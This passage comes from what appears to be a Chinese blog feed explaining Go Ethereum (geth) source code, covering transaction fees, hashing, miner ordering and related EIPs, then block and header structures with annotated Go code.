class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关于手续费">关于手续费</h2><p>首先判断是否采用了 EIP-1559，如果 <code>baseFee</code> 不存在的话，就返回最高的小费。然后手续费的单价需要高于基础费用，采取最大小费单价或者是最大手续费单价减去基础费用，这是矿工可盈利的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EffectiveGasTip returns the effective miner gasTipCap for the given base fee.</span></span><br><span class="line"><span class="comment">// Note: if the effective gasTipCap is negative, this method returns both error</span></span><br><span class="line"><span class="comment">// the actual negative value, _and_ ErrGasFeeCapTooLow</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span></span> EffectiveGasTip(baseFee *big.Int) (*big.Int, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> baseFee == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> tx.GasTipCap(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">gasFeeCap := tx.GasFeeCap()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gasFeeCap.Cmp(baseFee) == <span class="number">-1</span> &#123;</span><br><span class="line">err = ErrGasFeeCapTooLow</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 最大值 - 基础费和消费最大值中的小者</span></span><br><span class="line"><span class="keyword">return</span> math.BigMin(tx.GasTipCap(), gasFeeCap.Sub(gasFeeCap, baseFee)), err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="交易哈希">交易哈希</h3><p>交易哈希是交易参数哈希之后的值，对于类型化的交易需要额外考虑前八位的交易类型。具体密码学算法，不作探讨。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hash returns the transaction hash.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span></span> Hash() common.Hash &#123;</span><br><span class="line"><span class="keyword">if</span> hash := tx.hash.Load(); hash != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> hash.(common.Hash)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h common.Hash</span><br><span class="line"><span class="keyword">if</span> tx.Type() == LegacyTxType &#123;</span><br><span class="line"><span class="comment">//根据 Txdata 计算交易哈希</span></span><br><span class="line">h = rlpHash(tx.inner)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">h = prefixedRlpHash(tx.Type(), tx.inner)</span><br><span class="line">&#125;</span><br><span class="line">tx.hash.Store(h)</span><br><span class="line"><span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矿工对交易的封装和排序">矿工对交易的封装和排序</h3><p>首先封装交易和对应矿工费，矿工费为上文分析的手续费。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TxWithMinerFee wraps a transaction with its gas price or effective miner gasTipCap</span></span><br><span class="line"><span class="keyword">type</span> TxWithMinerFee <span class="keyword">struct</span> &#123;</span><br><span class="line">   tx       *Transaction</span><br><span class="line">   minerFee *big.Int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewTxWithMinerFee creates a wrapped transaction, calculating the effective</span></span><br><span class="line"><span class="comment">// miner gasTipCap if a base fee is provided.</span></span><br><span class="line"><span class="comment">// Returns error in case of a negative effective miner gasTipCap.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTxWithMinerFee</span><span class="params">(tx *Transaction, baseFee *big.Int)</span></span> (*TxWithMinerFee, <span class="type">error</span>) &#123;</span><br><span class="line">   minerFee, err := tx.EffectiveGasTip(baseFee)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;TxWithMinerFee&#123;</span><br><span class="line">      tx:       tx,</span><br><span class="line">      minerFee: minerFee,</span><br><span class="line">   &#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着需要根据 nonce 和手续费对交易排序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TransactionsByPriceAndNonce <span class="keyword">struct</span> &#123;</span><br><span class="line">txs     <span class="keyword">map</span>[common.Address]Transactions <span class="comment">// Per account nonce-sorted list of transactions</span></span><br><span class="line">heads   TxByPriceAndTime                <span class="comment">// Next transaction for each unique account (price heap)</span></span><br><span class="line">signer  Signer                          <span class="comment">// Signer for the set of transactions</span></span><br><span class="line">baseFee *big.Int                        <span class="comment">// Current base fee</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于同一个区块，基础费用是相同的，<code>heads</code> 是每个账户最小的未打包的交易的切片，它会从小到大排序。排序算法如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTransactionsByPriceAndNonce</span><span class="params">(signer Signer, txs <span class="keyword">map</span>[common.Address]Transactions, baseFee *big.Int)</span></span> *TransactionsByPriceAndNonce &#123;</span><br><span class="line">   <span class="comment">// Initialize a price and received time based heap with the head transactions</span></span><br><span class="line">   heads := <span class="built_in">make</span>(TxByPriceAndTime, <span class="number">0</span>, <span class="built_in">len</span>(txs))</span><br><span class="line">   <span class="keyword">for</span> from, accTxs := <span class="keyword">range</span> txs &#123;</span><br><span class="line">      acc, _ := Sender(signer, accTxs[<span class="number">0</span>])                   <span class="comment">//通过签名和对应交易恢复地址</span></span><br><span class="line">      wrapped, err := NewTxWithMinerFee(accTxs[<span class="number">0</span>], baseFee) <span class="comment">//带矿工费的交易</span></span><br><span class="line">      <span class="comment">// Remove transaction if sender doesn&#x27;t match from, or if wrapping fails.</span></span><br><span class="line">      <span class="keyword">if</span> acc != from || err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="built_in">delete</span>(txs, from) <span class="comment">//删除 map 中对应 Key</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      heads = <span class="built_in">append</span>(heads, wrapped)</span><br><span class="line">      txs[from] = accTxs[<span class="number">1</span>:] <span class="comment">//更新账户的交易列表</span></span><br><span class="line">   &#125;</span><br><span class="line">   heap.Init(&amp;heads) <span class="comment">//堆排序，小堆</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Assemble and return the transaction set</span></span><br><span class="line">   <span class="keyword">return</span> &amp;TransactionsByPriceAndNonce&#123;</span><br><span class="line">      txs:     txs,</span><br><span class="line">      heads:   heads,</span><br><span class="line">      signer:  signer,</span><br><span class="line">      baseFee: baseFee,</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是每个账户都提取一个交易，因此新建 <code>heads</code>。接着验证每个账户的签名，必须签名通过后才能加入 <code>heads</code>，同时更新原来每个账户的交易列表。</p><p>需要更新排序的交易时，会把 <code>heads[0]</code> 删除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shift replaces the current best head with the next one from the same account.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TransactionsByPriceAndNonce)</span></span> Shift() &#123;</span><br><span class="line">   acc, _ := Sender(t.signer, t.heads[<span class="number">0</span>].tx) <span class="comment">//根据签名和交易获取的地址</span></span><br><span class="line">   <span class="keyword">if</span> txs, ok := t.txs[acc]; ok &amp;&amp; <span class="built_in">len</span>(txs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">      <span class="comment">//封装交易和矿工费，取出矿工费最小的交易</span></span><br><span class="line">      <span class="keyword">if</span> wrapped, err := NewTxWithMinerFee(txs[<span class="number">0</span>], t.baseFee); err == <span class="literal">nil</span> &#123;</span><br><span class="line">         t.heads[<span class="number">0</span>], t.txs[acc] = wrapped, txs[<span class="number">1</span>:]</span><br><span class="line">         heap.Fix(&amp;t.heads, <span class="number">0</span>) <span class="comment">//Fix 在索引 i 处的元素更改其值后重新建立堆排序。</span></span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   heap.Pop(&amp;t.heads)<span class="comment">//删除第一个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Message-对象">Message 对象</h4><p><code>message</code> 会封装合约，方便后面执行代码，日后将会移除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Message is a fully derived transaction and implements core.Message</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> In a future PR this will be removed.</span></span><br><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span> &#123;</span><br><span class="line">   to         *common.Address</span><br><span class="line">   from       common.Address</span><br><span class="line">   nonce      <span class="type">uint64</span></span><br><span class="line">   amount     *big.Int</span><br><span class="line">   gasLimit   <span class="type">uint64</span></span><br><span class="line">   gasPrice   *big.Int</span><br><span class="line">   gasFeeCap  *big.Int</span><br><span class="line">   gasTipCap  *big.Int</span><br><span class="line">   data       []<span class="type">byte</span></span><br><span class="line">   accessList AccessList</span><br><span class="line">   isFake     <span class="type">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="影响交易的-EIP">影响交易的 EIP</h2><h3 id="EIP-155">EIP-155</h3><p>重放攻击保护——防止了在一个以太坊链上的交易被重复广播到另外一条链。从区块高度 2,675,000 开始，为了签名计算交易哈希时应该加入 <code>chainid</code>，并且签名的 <code>v</code> 需要为 <code>&#123;0,1&#125; + CHAIN_ID * 2 + 35</code>，如果是不加入 <code>chainid</code>，那么 <code>v</code> 为 <code>&#123;0,1&#125; + 27</code> 也可以。</p><h3 id="EIP-1559">EIP-1559</h3><p>改变交易的手续费机制，并且通过动态的区块大小避免短时间的拥塞。</p><p>首选对于单位 gas 都有基础费用，它是由父区块使用的 gas（gasused）和 gas 上限决定。这个机制导致当父区块的 gas 上限过大时，单位 gas 的基础费用就增加，反之则减少。基础费用会销毁而不是分给矿工。交易可以指定最高的 gas 单价，它包括了基础的区块费用和为交易优先打包的小费。</p><h3 id="EIP-2718">EIP-2718</h3><p>定义新的交易类型，它可以作为未来的交易类型的封装。未来可能会通过底层的交易类型来指定转移支付 gas 的交易、多签名的交易，而不用通过合约实现复杂且高消耗的逻辑。封装一层，将来出现不同的 <code>Txdata</code> 时能保证向后兼容。</p><p>具体地，需要在原来的 <code>Txdata</code> 编码之前加上 8 位的类型标识，并且对于类型化的交易将会采用新的解释方式。例如 <code>TransactionType || TransactionPayload</code>, <code>TransactionPayload</code> 是难懂的字节数组，和交易的类型有关，将来可能采用不同的编码方式。</p><h3 id="EIP-2929">EIP-2929</h3><p>提高部分操作 <code>storage</code> 的操作码在交易中第一次执行时消耗的 gas。代码为 <code>0x54</code> 的 <code>SLOAD</code> 的 gas 成本增加到 2100，将<code>*CALL</code>操作码族 ( <code>0xf1</code>, <code>f2</code>, <code>f4</code>, <code>fA</code>)、<code>BALANCE</code> <code>0x31</code> 和 <code>EXT*</code>操作码族 ( <code>0x3b</code>, <code>0x3c</code>, <code>0x3f</code>) 增加到 2600。</p><h3 id="EIP-2930">EIP-2930</h3><p>添加新的带有 <code>access list</code> 的交易类型，访问列表里是地址列表和交易将访问的关键字。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>理解区块</title>
    <link href="https://www.blog-blockchain.xyz/geth/blocks/"/>
    <id>https://www.blog-blockchain.xyz/geth/blocks/</id>
    <published>2022-08-25T00:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="结构定义">结构定义</h2><h3 id="区块">区块</h3><p><img src="https://pic2.zhimg.com/80/v2-90964a7f9d10855d21287c768875068d_1440w.jpg" alt="img"></p><p>首先我们需要明白区块的结构。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Block represents an entire block in the Ethereum blockchain.</span></span><br><span class="line"><span class="keyword">type</span> Block <span class="keyword">struct</span> &#123;</span><br><span class="line">   header       *Header      <span class="comment">//区块头</span></span><br><span class="line">   uncles       []*Header    <span class="comment">//引用的叔块</span></span><br><span class="line">   transactions Transactions <span class="comment">//交易</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// caches</span></span><br><span class="line">   hash atomic.Value <span class="comment">//区块哈希</span></span><br><span class="line">   size atomic.Value <span class="comment">//区块大小</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Td is used by package core to store the total difficulty</span></span><br><span class="line">   <span class="comment">// of the chain up to and including the block.</span></span><br><span class="line">   td *big.Int <span class="comment">//链的总难度，与最长链原则相关</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//与 p2p 功能相关</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// These fields are used by package eth to track</span></span><br><span class="line">   <span class="comment">// inter-peer block relay.</span></span><br><span class="line">   ReceivedAt   time.Time</span><br><span class="line">   ReceivedFrom <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些参数的具体含义需要读者有一定的基础，例如理解什么是区块头、叔块、区块哈希、区块大小。读者可阅读<a href="https://ethereum.org/zh/developers/docs/">官方文档</a>。</p><h3 id="区块头">区块头</h3><p>区块头用于构成链式结构和快速验证。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Header <span class="keyword">struct</span> &#123;</span><br><span class="line">   ParentHash common.Hash    <span class="string">`json:&quot;parentHash&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   UncleHash  common.Hash    <span class="string">`json:&quot;sha3Uncles&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   Coinbase   common.Address <span class="string">`json:&quot;miner&quot;            gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//状态树根哈希</span></span><br><span class="line">   Root common.Hash <span class="string">`json:&quot;stateRoot&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//交易数根哈希</span></span><br><span class="line">   TxHash common.Hash <span class="string">`json:&quot;transactionsRoot&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//收据树根哈希</span></span><br><span class="line">   ReceiptHash common.Hash <span class="string">`json:&quot;receiptsRoot&quot;     gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//布隆过滤器</span></span><br><span class="line">   Bloom      Bloom    <span class="string">`json:&quot;logsBloom&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   Difficulty *big.Int <span class="string">`json:&quot;difficulty&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">   Number     *big.Int <span class="string">`json:&quot;number&quot;           gencodec:&quot;required&quot;`</span></span><br><span class="line">   GasLimit   <span class="type">uint64</span>   <span class="string">`json:&quot;gasLimit&quot;         gencodec:&quot;required&quot;`</span></span><br><span class="line">   GasUsed    <span class="type">uint64</span>   <span class="string">`json:&quot;gasUsed&quot;          gencodec:&quot;required&quot;`</span></span><br><span class="line">   Time       <span class="type">uint64</span>   <span class="string">`json:&quot;timestamp&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//为未来共识机制调整预留的额外字段</span></span><br><span class="line">   Extra []<span class="type">byte</span> <span class="string">`json:&quot;extraData&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//验证 PoW 时，从 Nonce 计算出的中间数据，可以减少验证时的计算量。</span></span><br><span class="line">   <span class="comment">//并且可以防止故意发送错误的验证信息导致验证者遭受拒绝服务攻击。</span></span><br><span class="line">   MixDigest common.Hash <span class="string">`json:&quot;mixHash&quot;`</span></span><br><span class="line">   <span class="comment">// 验证挖矿时的随机数，请了解挖矿过程。</span></span><br><span class="line">   Nonce BlockNonce <span class="string">`json:&quot;nonce&quot;`</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// BaseFee was added by EIP-1559 and is ignored in legacy headers.</span></span><br><span class="line">   BaseFee *big.Int <span class="string">`json:&quot;baseFeePerGas&quot; rlp:&quot;optional&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要读者有理解如何成链的流程，如果不熟悉，可以阅读我以前学习比特币时的<a href="https://zhuanlan.zhihu.com/p/331906800">区块链基础</a>。</p><p>其次，出现了布隆过滤器，后面的源码解读的文章将会详细介绍。关于 MPT 树的介绍即将在《以太坊的数据组织》中给出。</p><h3 id="初始值和辅助变量">初始值和辅助变量</h3><p>区块内可能没有交易，被称作空区块；区块也可能没有引用叔块，对于这两种情况都有自己的默认哈希值。</p><p>当交易树为空和收据树为空时的根哈希相同，如下定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   <span class="comment">//区块中不含有交易时的 MPT 树根哈希</span></span><br><span class="line">   EmptyRootHash = common.HexToHash(<span class="string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>)</span><br><span class="line">   <span class="comment">//引用的叔块不含有交易时的哈希，请自行理解叔块</span></span><br><span class="line">   EmptyUncleHash = rlpHash([]*Header(<span class="literal">nil</span>))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为了证明矿工成功挖矿，定义了使得满足难度要求的随机数为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A BlockNonce is a 64-bit hash which proves (combined with the</span></span><br><span class="line"><span class="comment">// mix-hash) that a sufficient amount of computation has been carried</span></span><br><span class="line"><span class="comment">// out on a block.</span></span><br><span class="line"><span class="keyword">type</span> BlockNonce [<span class="number">8</span>]<span class="type">byte</span></span><br></pre></td></tr></table></figure><p>但是，恶意的矿工可能大量的发送错误的随机数，导致其他节点大量地验证错误信息，造成 DDoS 攻击，因此提出了区块头的 <code>MixDigest</code> 成员，它是从随机数生成的中间过程的哈希，能够减少验证的资源消耗。因为计算<code>MixDigest</code> 需要消耗资源，一定程度上防止了 DDos。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//验证 PoW 时，从 Nonce 计算出的中间数据，可以减少验证时的计算量。</span></span><br><span class="line">   <span class="comment">//并且可以防止故意发送错误的验证信息导致验证者遭受拒绝服务攻击。</span></span><br><span class="line">   MixDigest common.Hash <span class="string">`json:&quot;mixHash&quot;`</span></span><br></pre></td></tr></table></figure><h3 id="区块体">区块体</h3><p>区块的主体是交易和引用的叔块，用于暂存数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Body is a simple (mutable, non-safe) data container for storing and moving</span></span><br><span class="line"><span class="comment">// a block&#x27;s data contents (transactions and uncles) together.</span></span><br><span class="line"><span class="keyword">type</span> Body <span class="keyword">struct</span> &#123;</span><br><span class="line">   Transactions []*Transaction</span><br><span class="line">   Uncles       []*Header</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数">函数</h2><h3 id="区块随机数的赋值">区块随机数的赋值</h3><p>区块的随机数定义了一系列的类型转换和赋值函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//整数转换成 BlockNonce</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EncodeNonce converts the given integer to a block nonce.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncodeNonce</span><span class="params">(i <span class="type">uint64</span>)</span></span> BlockNonce &#123;</span><br><span class="line">   <span class="keyword">var</span> n BlockNonce</span><br><span class="line">   binary.BigEndian.PutUint64(n[:], i)</span><br><span class="line">   <span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BlockNonce 转成整数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 returns the integer value of a block nonce.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n BlockNonce)</span></span> Uint64() <span class="type">uint64</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> binary.BigEndian.Uint64(n[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BlockNonce 转换成十六进制字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MarshalText encodes n as a hex string with 0x prefix.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n BlockNonce)</span></span> MarshalText() ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> hexutil.Bytes(n[:]).MarshalText()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查 input 的字节是否和所需的类型的相同，相同时用 input 设置 BlockNonce 的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// UnmarshalText implements encoding.TextUnmarshaler.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *BlockNonce)</span></span> UnmarshalText(input []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> hexutil.UnmarshalFixedText(<span class="string">&quot;BlockNonce&quot;</span>, input, n[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="垃圾信息检查">垃圾信息检查</h3><p>由于区块头有动态的类型，为了防止填充垃圾信息，源码中通过占用的内存长度检查。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 